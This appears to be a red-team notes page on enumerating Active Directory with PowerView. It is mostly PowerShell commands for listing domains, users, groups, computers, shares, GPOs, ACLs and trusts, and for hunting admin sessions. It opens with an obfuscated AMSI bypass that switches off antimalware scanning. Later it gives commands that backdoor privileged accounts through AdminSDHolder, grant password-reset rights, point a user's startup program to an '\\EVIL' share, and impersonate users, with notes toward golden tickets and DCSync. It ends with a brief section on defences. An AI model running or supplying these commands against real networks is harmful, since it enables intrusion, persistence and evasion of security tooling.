---
title: "PowerView"
description: "Enumeration methods using PowerView."
lead: "Enumeration of the domain, users, groups, and computers using PowerView."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_enumeration"
weight: 30
toc: true
---

## Loading PowerView

```powershell
# If it gets blocked by AMSI we can bypass it with
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Then load the module
Import-Module .\PowerView.ps1
. .\PowerView.ps1
```

## Domains

- General domain information
- Password policy
- Ticket policy, interesting for crafting appropriate golden/silver tickets
- List of domain controllers and HVTs

```powershell
# Get current domain
Get-NetDomain

# Get object of another domain
Get-NetDomain -Domain lab.local

# Get domain SID for current domain
Get-DomainSID

# Get domain policy for current domain
Get-DomainPolicy
(Get-DomainPolicy)."System Access"

# Get domain policy for another domain
# Password policy
(Get-DomainPolicy -Domain lab.local)."System Access"

# Kerberos policy for e.g. mimikatz golden tickets
(Get-DomainPolicy -Domain lab.local)."Kerberos Policy"

# Get domain controllers for current domain
Get-NetDomainController

# Get domain controllers for another domain
Get-NetDomainController -Domain lab.local

# enumerate all gobal catalogs in the forest
Get-ForestGlobalCatalog

# Turn a list of computer short names to FQDNs, using a global catalog
gc computers.txt | % {Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP "(name=$_)" -Properties dnshostname}

# Enumerate the current domain controller policy
$DCPolicy = Get-DomainPolicy -Policy DC
$DCPolicy.PrivilegeRights # user privilege rights on the dc...

# Enumerate the current domain policy
$DomainPolicy = Get-DomainPolicy -Domain bufu-sec.local
$DomainPolicy.KerberosPolicy # useful for golden tickets ;)
$DomainPolicy.SystemAccess # password age/etc.
```

## Users

- List of users
- Inactive users
- Possible honeypot users with very low logon counts

```powershell
# Get list of users in current domain
Get-NetUser
Get-NetUser -Username student1
Get-NetUser | Select cn

# Find all users with an SPN (likely service accounts)
Get-DomainUser -SPN

# Find all service accounts in "Domain Admins"
Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}

# Check for users who don't have kerberos preauthentication set
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter DONT_REQ_PREAUTH

# Find users with sidHistory set
Get-DomainUser -LDAPFilter '(sidHistory=*)'

# Find any users with constrained delegation set
Get-DomainUser -TrustedToAuth

# Find all privileged users that aren't marked as sensitive/not for delegation
Get-DomainUser -AllowDelegation -AdminCount

# Get list of all properties for users in current domain
Get-UserProperty
Get-UserProperty -Properties pwdlastset

# Search for a particular string in a user's attributes
Find-UserField -SearchField Description -SearchTerm "built"

# Get actively logged on users on a computer (needs local admin rights on the target)
Get-NetLoggedOn -ComputerName dc.lab.local

# Get actively logged on users on a computer (needs remote registry on the target - started by default on server OS)
Get-LoggedOnLocal -ComputerName dc.lab.local

# Get the last logged user on a computer (needs administrative rights and remote registry on the target)
Get-LastLoggedOn -ComputerName dc.lab.local

# Get all users with passwords changed > 1 year ago, returning sam account names and password last set times
$Date = (Get-Date).AddYears(-1).ToFileTime()
Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset

# Get all enabled users, returning distinguishednames
Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname

# Get all disabled users
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
Get-DomainUser -UACFilter ACCOUNTDISABLE

# Get all users that require smart card authentication
Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)"
Get-DomainUser -UACFilter SMARTCARD_REQUIRED

# Get all users that *don't* require smart card authentication, only returning sam account names
Get-DomainUser -LDAPFilter "(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)" -Properties samaccountname
Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname

# Use multiple identity types for any *-Domain* function
'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff

# enumerate all foreign users in the global catalog, and query the specified domain localgroups for their memberships
#   query the global catalog for foreign security principals with domain-based SIDs, and extract out all distinguishednames
$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase "GC://testlab.local" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname
$Domains = @{}
$ForeignMemberships = ForEach($ForeignUser in $ForeignUsers) {
    # extract the domain the foreign user was added to
    $ForeignUserDomain = $ForeignUser.SubString($ForeignUser.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
    # check if we've already enumerated this domain
    if (-not $Domains[$ForeignUserDomain]) {
        $Domains[$ForeignUserDomain] = $True
        # enumerate all domain local groups from the given domain that have membership set with our foreignSecurityPrincipal set
        $Filter = "(|(member=" + $($ForeignUsers -join ")(member=") + "))"
        Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member
    }
}
$ForeignMemberships | fl

# if running in -sta mode, impersonate another credential a la "runas /netonly"
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf

# Set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose

# Set the owner of 'dfm' in the current domain to 'harmj0y'
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y

# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? {
    ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')
}

# check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
```

## Computers

- Types of computers
- Roles of computers
- Used operating systems
- Live hosts

```powershell
# Get list of computers in current domain
Get-NetComputer
Get-NetComputer -FullData

# Check for live hosts (depends on ICMP)
Get-NetComputer -Ping

# Information about operating systems
Get-NetComputer -OperatingSystem "*Server 2016"
Get-NetComputer -FullData | select dnshostname,operatingsystem

# Get list of sessions on computer
Get-NetSession -ComputerName "dc01.lab.local"

# Find any computers with constrained delegation set
Get-DomainComputer -TrustedToAuth

# Find all servers that allow unconstrained delegation
Get-DomainComputer -Unconstrained

# Return the local *groups* of a remote server
Get-NetLocalGroup SERVER.domain.local

# Return the local group *members* of a remote server using Win32 API methods (faster but less info)
Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local

# enumerates computers in the current domain with 'outlier' properties, i.e. properties not set from the firest result returned by Get-DomainComputer
Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier
```

## Groups

- Intersting domain and local groups
- Group members
- Group membership for current user
- Query information about groups from forest root, e.g. for Enterprise Admins
- If RID is 5xx, it is built in, otherwise custom

```powershell
# Get all groups in current domain
Get-NetGroup
Get-NetGroup -FullData

# Get information about groups in other domain
Get-NetGroup -Domain lab.local

# Get all groups containing the word "admin" in group name
Get-NetGroup "*admin*"

# Get information about specific group
Get-NetGroup -FullData "Domain Admins"

# Get all members of Domain Admins group
# If member is a group, get members of that group as well
Get-NetGroupMember -GroupName "Domain Admins" -Recurse

# Get list of Enterprise Admins, only available from forest root
Get-NetGroupMember -GroupName "Enterprise Admins" -Domain lab.local

# Get group membership for a user
Get-NetGroup -UserName "student1"

# List all local groups on a machine (needs administrator privileges on non-dc machines)
Get-NetLocalGroup -ComputerName dc.lab.local -ListGroups

# Get members of all local groups on a machine (needs administrator privileges on non-dc machines)
Get-NetLocalGroup -ComputerName dc.lab.local -Recurse

# Find linked DA accounts using name correlation
Get-DomainGroupMember 'Domain Admins' | %{Get-DomainUser $_.membername -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -LDAPFilter "(displayname=*$a*)" -Properties displayname,samaccountname}

# Find any machine accounts in privileged groups
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}

# Enumerate all groups in a domain that don't have a global scope, returning just group names
Get-DomainGroup -GroupScope NotGlobal -Properties name
```

## Files & Shares

```powershell
# Find shares on hosts in current domain
Invoke-ShareFinder -Verbose

# Find shares from other domain
Invoke-ShareFinder -Domain lab.local

# Exclude default shares
Invoke-ShareFinder -ExcludeStandard

# Show only shares the current user has access to
Invoke-ShareFinder -CheckShareAccess

# Find sensitive files on computers in the domain
Invoke-FileFinder -Verbose

# Get all fileservers of the domain
Get-NetFileServer

# use alternate credentials for searching for files on the domain
# Find-InterestingDomainShareFile == old Invoke-FileFinder
$Password = "PASSWORD" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential("DOMAIN\user",$Password)
Find-InterestingDomainShareFile -Domain DOMAIN -Credential $Credential
```

## Group Policy

- Security settings
- Registry-based policy settings
- GPP like start/shutdown/log-on/logff script settings
- Software installation
- Abused for privesc, backdoors, persistence

```powershell
# Display RSoP summary data
gpresult /R

# Get list of GPO in current domain
Get-NetGPO
Get-NetGPO | Select displayname
Get-NetGPO -ComputerName ws01.lab.local
Get-DomainGPO -ComputerIdentity windows1.testlab.local

# Get GPO(s) which use Restricted Groups or groups.xml for interesting users
Get-NetGPOGroup

# Get users which are in a local group of a machine using GPO
Find-GPOComputerAdmin -ComputerName ws01.lab.local

# Get machines where the given user is member of a specific group
Find-GPOLocation -UserName user -Verbose

# Enumerate what machines that a particular user/group identity has local admin rights to
# Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>

# Enumerate what machines that a given user in the specified domain has RDP access rights to
Get-DomainGPOUserLocalGroupMapping -Identity <USER> -Domain <DOMAIN> -LocalGroup RDP

# Export a csv of all GPO mappings
Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv
```

## Organizational Units

```powershell
# Get OUs in a domain
Get-NetOU -FullData

# Get GPO applied on an OU. Read GPOName from gplink attribute from Get-NetOU
Get-NetGPO -GPOname "{AB306569-220D-43FF-B03B-83E8F4EF8081}"

# Find all computers in a given OU
Get-DomainComputer -SearchBase "ldap://OU=..."

# Get the logged on users for all machines in any *server* OU in a particular domain
Get-DomainOU -Identity *server* -Domain <domain> | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}}
```

## Access Control Lists

- Access Control Entries (ACE) correspond to individual permission or audits access
- Who has permission and what can be done on an object?
- Two types:
  - DACL -> Defines the permissions trustees (a user or group) have on an object
  - SACL - Logs success and failure audit messages when an object is accessed

```powershell
# Get the ACLs associated with the specified object
Get-ObjectACL -SamAccountName "Users" -ResolveGUIDs

# Get the ACLs associated with the specified prefix to be used for search
Get-ObjectACL -ADSPrefix 'CN=Administrator,CN=Users' -Verbose

# Get the ACLs associated with the specified LDAP path to be used for search
Get-ObjectACL -ADSPath "LDAP://CN=Domain Admins,CN=Users,DC=dc01,DC=dc02,DC=local" -ResolveGUIDs -Verbose

# Search for interesting ACEs
Invoke-ACLScanner -ResolveGUIDs

# Get the ACLs associated with the specified path
Get-PathACL -Path "\\dc01.lab.local\sysvol"

# Enumerate who has rights to the 'matt' user in 'testlab.local', resolving rights GUIDs to names
Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local

# Grant user 'will' the rights to change 'matt's password
Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose

# Audit the permissions of AdminSDHolder, resolving GUIDs
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs

# Backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All

# Retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}

# Enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
```

## Trusts

- Relationship between two domains or forest
- Trusted Domain Objects (TDOs) represent trust relationship in a domain
- Types of trusts
  - One-way: users in trusted domain can access resources in the trusting domain
  - Two-way trust: users of both domains can access resources in the other domain
  - Transitive: If A and B trust each other and B and C trust each other, A and C also trust each other (default between domains in same forest)
  - Non-transitive: cannot be extended to other domains in the forest (default between two domains in different forests)
  - Automatic trust: created automatically when creating new subdomain (parent-child, tree-root)
  - Shortcut trusts: used to reduce access time in complex trust scenarios
  - External trusts: between two domains in different forests when forests do not have a turst relationships
  - Forest trusts: between forest root domains

```powershell
# Get a list of all domain trusts for the current domain
Get-NetDomainTrust
Get-NetDomainTrust -Domain test.lab.local
```

## Forest Mapping

```powershell
# Get details about the current forest
Get-NetForest
Get-NetForest -Forest lab.local

# Get all domains in the current forest
Get-NetForestDomain
Get-NetForestDomain -Forest lab.local

# Get all global catalogs for the current forest
Get-NetForestCatalog
Get-NetForestCatalog -Forest lab.local

# Map trusts of a forest
Get-NetForestTrust
Get-NetForestTrust -Forest lab.local

# Map all trusts in current forest
Get-NetForestDomain |  Get-NetDomainTrust
```

## User Hunting

```powershell
# Find all machines on the current domain where the current user has local admin access
# This function queries the DC of the current or provided domain for a list of computers ( Get-NetComputer ) and then use multi-threaded Invoke-CheckLocalAdminAccess on each machine.
# Can also be done using WMI and PowerShell Remoting
# See Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1
Find-LocalAdminAccess -Verbose

# Find local admins on all machines of the domain (needs administrator privs on non-dc machines).
# This function queries the DC of the current or provided domain for a list of computers ( Get-NetComputer ) and then use multi-threaded Get-NetLocalGroup on each machine.
Invoke-EnumerateLocalAdmin -Verbose

# Find computers where a domain admin (or specified user/group) has sessions
# This function queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-NetGroupMember , gets a list of computers ( Get-NetComputer ) and list sessions and logged on users Get-NetSession/Get-NetLoggedon ) from each
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"

# To confirm admin access
Invoke-UserHunter -CheckAccess

# Find computers where a domain admin is logged-in.
# This option queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-NetGroupMember , gets a list _only_ of high traffic servers (DC, File Servers and Distributed File servers) for less traffic generation and list sessions and logged on users ( Get-NetSession/Get-NetLoggedon ) from each machine.
Invoke-UserHunter -Stealth

# Find-DomainUserLocation == old Invoke-UserHunter
# enumerate servers that allow unconstrained Kerberos delegation and show all users logged in
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

# hunt for admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation
```

### Defending against User Hunting

#### NetCease

- Script to change permissions on `NetSessionEnum` method by removing permissions for `Authenticated Users` group
- Fails many of the attacker's session enumeration and hence user hunting capabilities

```powershell
.\NetCease.ps1
```

#### SAMRi10

- From same author as NetCease
- Hardens Windows 10 and Server 2016 against enumeration wihch uses SAMR protocol (like net.exe)
- https://gallery.technet.microsoft.com/SAMRi10-Hardening-Remote-48d94b5b
